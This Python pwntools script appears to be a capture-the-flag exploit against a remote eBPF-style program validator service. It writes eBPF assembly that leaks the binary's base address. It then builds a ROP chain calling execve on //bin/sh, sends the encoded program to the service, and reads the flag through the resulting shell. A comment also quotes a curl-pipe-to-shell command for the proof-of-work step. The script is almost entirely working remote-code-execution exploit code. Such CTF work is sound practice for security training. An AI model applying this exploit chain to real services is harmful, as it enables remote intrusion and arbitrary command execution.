#!/usr/bin/env python3

from pwn import logging, process, u64, remote
import argparse
from pathlib import Path

# context.terminal = ['kgx']

logging.disable()


def main(hostname, port):
    def rop():
        from struct import pack

        def p(x): return pack('Q', x)

        # 9c6d92a2adc6525f1392eb35dd0a1f735b13f9d250189ca1135cfb3d936b8d80
        IMAGE_BASE_0 = 0x0000000000000000
        def rebase_0(x): return p(x + IMAGE_BASE_0)

        rop = b''

        # 0x00000000000250b3: pop rax; ret;
        rop += rebase_0(0x00000000000250b3)
        rop += b'//bin/sh'
        # 0x000000000000bc52: pop rdi; ret;
        rop += rebase_0(0x000000000000bc52)
        rop += rebase_0(0x000000000008a000)
        # 0x0000000000037a30: mov qword ptr [rdi], rax; ret;
        rop += rebase_0(0x0000000000037a30)
        # 0x00000000000250b3: pop rax; ret;
        rop += rebase_0(0x00000000000250b3)
        rop += p(0x0000000000000000)
        # 0x000000000000bc52: pop rdi; ret;
        rop += rebase_0(0x000000000000bc52)
        rop += rebase_0(0x000000000008a008)
        # 0x0000000000037a30: mov qword ptr [rdi], rax; ret;
        rop += rebase_0(0x0000000000037a30)
        # 0x000000000000bc52: pop rdi; ret;
        rop += rebase_0(0x000000000000bc52)
        rop += rebase_0(0x000000000008a000)
        # 0x000000000000a109: pop rsi; ret;
        rop += rebase_0(0x000000000000a109)
        rop += rebase_0(0x000000000008a008)
        # 0x0000000000044610: pop rdx; add al, 0; pop rcx; ret;
        rop += rebase_0(0x0000000000044610)
        rop += rebase_0(0x000000000008a008)
        rop += p(0xdeadbeefdeadbeef)
        # 0x00000000000250b3: pop rax; ret;
        rop += rebase_0(0x00000000000250b3)
        rop += p(0x000000000000003b)
        rop += rebase_0(0x000000000001be01)  # 0x000000000001be01: syscall;

        def chop(x):
            for i in range(0, len(x), 8):
                yield x[i:i+8]

        for i, gadg in enumerate(chop(rop)):
            print(f"lddw r0, {u64(gadg):#x}")
            print("add r0, r3")  # add elf base
            print(f"stxdw [r1+{i*8}], r0")  #  store gadget to stack

    # retrieve the cursed ebpf program

    io = process(str(Path(__file__).parent / 'client'))
    io.send(f"""
    mov r1, 1
    or r2, 0x00007ffc
    lsh r2, 32
    or r2, 0x58cd8000

    mov r3, 1

    mov r4, 1
    lsh r4, 47

    giant:
        add r2, 0x800000
        jge r2, r4, do_end
        syscall write
        jne r0, 1, giant

    mov r5, r2

    mov r7, 0x42
    baby:
        jge r2, r4, do_end
        syscall write
        add r2, 0x1000
        jeq r0, 1, baby

    mov r7, 0x43
    sub r2, 0x5000
    mov r3, r2
    mov r1, r2
    mov r2, r5
    find_ret:
        syscall str_cmp
        jeq r0, 0x12, found_ret
        add r1, 8
        ja find_ret

    found_ret:
        mov r7, 0x44
    load_8_bytes:
        mov r7, 8
        mov r3, 0
        add r1, 7
        syscall str_cmp
        or r3, r0
        lsh r3, 8
        sub r1, 1

        syscall str_cmp
        or r3, r0
        lsh r3, 8
        sub r1, 1

        syscall str_cmp
        or r3, r0
        lsh r3, 8
        sub r1, 1

        syscall str_cmp
        or r3, r0
        lsh r3, 8
        sub r1, 1

        syscall str_cmp
        or r3, r0
        lsh r3, 8
        sub r1, 1

        syscall str_cmp
        or r3, r0
        lsh r3, 8
        sub r1, 1

        syscall str_cmp
        or r3, r0
        lsh r3, 8
        sub r1, 1

        syscall str_cmp
        or r3, r0

        sub r3, 0x1f012


    lddw r0, 0x250b3
    add r0, r3
    stxdw [r1+0], r0
    lddw r0, 0x68732f6e69622f2f
    stxdw [r1+8], r0
    lddw r0, 0xbc52
    add r0, r3
    stxdw [r1+16], r0
    lddw r0, 0x8a000
    add r0, r3
    stxdw [r1+24], r0
    lddw r0, 0x37a30
    add r0, r3
    stxdw [r1+32], r0
    lddw r0, 0x250b3
    add r0, r3
    stxdw [r1+40], r0
    lddw r0, 0x0
    add r0, r3
    stxdw [r1+48], r0
    lddw r0, 0xbc52
    add r0, r3
    stxdw [r1+56], r0
    lddw r0, 0x8a008
    add r0, r3
    stxdw [r1+64], r0
    lddw r0, 0x37a30
    add r0, r3
    stxdw [r1+72], r0
    lddw r0, 0xbc52
    add r0, r3
    stxdw [r1+80], r0
    lddw r0, 0x8a000
    add r0, r3
    stxdw [r1+88], r0
    lddw r0, 0xa109
    add r0, r3
    stxdw [r1+96], r0
    lddw r0, 0
    stxdw [r1+104], r0
    lddw r0, 0x44610
    add r0, r3
    stxdw [r1+112], r0
    lddw r0, 0

    stxdw [r1+120], r0
    lddw r0, 0xdeadbeefdeadbeef
    add r0, r3
    stxdw [r1+128], r0
    lddw r0, 0x250b3
    add r0, r3
    stxdw [r1+136], r0
    lddw r0, 0x3b

    stxdw [r1+144], r0
    lddw r0, 0x1be01
    add r0, r3
    stxdw [r1+152], r0
    exit

    do_end:
        mov r1, 0x50
        mov r1, 4
        mov r3, 1
        syscall write
        exit
    """.encode())

    # send EOF
    io.shutdown('send')

    l = io.recvall().decode().split('\n')
    # print('\n'.join(l))

    program_hex = "b70100000100000047020000fc7f00006702000020000000470200000080cd58b703000001000000b704000001000000670400002f00000007020000000080003d42810000000000850000008cfa1dbd5500fcff01000000bf25000000000000b7070000420000003d427c0000000000850000008cfa1dbd07020000001000001500fcff01000000b7070000430000001702000000500000bf23000000000000bf21000000000000bf5200000000000085000000947b3f87150002001200000007010000080000000500fcff00000000b707000044000000b707000008000000b703000000000000070100000700000085000000947b3f874f030000000000006703000008000000170100000100000085000000947b3f874f030000000000006703000008000000170100000100000085000000947b3f874f030000000000006703000008000000170100000100000085000000947b3f874f030000000000006703000008000000170100000100000085000000947b3f874f030000000000006703000008000000170100000100000085000000947b3f874f030000000000006703000008000000170100000100000085000000947b3f874f030000000000006703000008000000170100000100000085000000947b3f874f030000000000001703000012f0010018000000b350020000000000000000000f300000000000007b01000000000000180000002f2f6269000000006e2f73687b010800000000001800000052bc000000000000000000000f300000000000007b011000000000001800000000a0080000000000000000000f300000000000007b0118000000000018000000307a030000000000000000000f300000000000007b0120000000000018000000b350020000000000000000000f300000000000007b01280000000000180000000000000000000000000000000f300000000000007b013000000000001800000052bc000000000000000000000f300000000000007b013800000000001800000008a0080000000000000000000f300000000000007b0140000000000018000000307a030000000000000000000f300000000000007b014800000000001800000052bc000000000000000000000f300000000000007b015000000000001800000000a0080000000000000000000f300000000000007b015800000000001800000009a1000000000000000000000f300000000000007b01600000000000180000000000000000000000000000007b01680000000000180000001046040000000000000000000f300000000000007b01700000000000180000000000000000000000000000007b0178000000000018000000efbeadde00000000efbeadde0f300000000000007b0180000000000018000000b350020000000000000000000f300000000000007b01880000000000180000003b00000000000000000000007b019000000000001800000001be010000000000000000000f300000000000007b019800000000009500000000000000b701000050000000b701000004000000b703000001000000850000008cfa1dbd9500000000000000"
    mem_hex = "aabb1122ccdd"
    config_hex = "1400000000000000001000000000000010270000000000000001000058e26cfa0001000000000101010101010101010101699ab7c0550000"

    # program_hex = l[0].split(':')[1].strip()
    # mem_hex = l[1].split(':')[1].strip()
    # config_hex = l[2].split(':')[1].strip()

    # print('program hex:', program_hex)
    # print('mem hex:', mem_hex)
    # print('config hex:', config_hex)
    io.close()

    # io = remote('localhost', 10015)
    # io = process('./target/debug/server')

    # gdbscript = f"""

    # brva 0x00000000000250b3
    # c
    # #si
    # #x/70i $rip
    # #b *($rip + 262)
    # #b bpf_str_cmp
    # """
    # with open("gdbscript.txt", "w") as f:
    #     f.write(gdbscript)
    # io = gdb.debug('../dist/server', gdbscript=gdbscript)

    # io = process('../dist/server')
    # ui.pause()

    for i in range(1, 5):
        io = remote(hostname, port)
        do_pow(io)

        io.recvuntil(b'Enter your program as a hex string: ')
        io.sendline(program_hex.encode())
        io.recvuntil(b'Enter your program memory as a hex string: ')
        io.sendline(mem_hex.encode())
        io.recvuntil(b'Enter your program config as a hex string: ')
        io.sendline(config_hex.encode())

        io.sendline(b'cat flag.txt')
        io.sendline(b'exit')

        l = io.recvall(timeout=3)
        # print(l)
        io.close()

        if b'ifctf{imagine_getting_rce_on_a_validator_lol}' in l:
            print(f'OK - flag found in {i} tries')
            exit(0)

    print('ERR - flag not found')
    exit(1)


def do_pow(io):
    import string
    import subprocess
    io.recvuntil(b"proof of work: ")
    data = io.recvline().split(b" -s ")[-1].decode()[:-1]
    # check that data is letter.base64.base64
    assert len(data.split(".")) == 3
    assert data.split(".")[0] in string.ascii_letters
    base64letters = string.ascii_letters + string.digits + "+/="
    assert all(d in base64letters for d in data.split(".")[1])
    assert all(d in base64letters for d in data.split(".")[2])
    # get pow by running "curl -sSfL https://pwn.red/pow | sh -s <data>"
    pow_file = Path(__file__).parent / "pow.sh"
    pow = subprocess.check_output(f"{pow_file} {data}", shell=True).strip()
    io.sendlineafter(b"solution: ", pow)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--hostname')
    parser.add_argument('--port')
    args = parser.parse_args()

    hostname = args.hostname or 'localhost'
    port = int(args.port) if args.port is not None else 10001

    main(hostname, port)
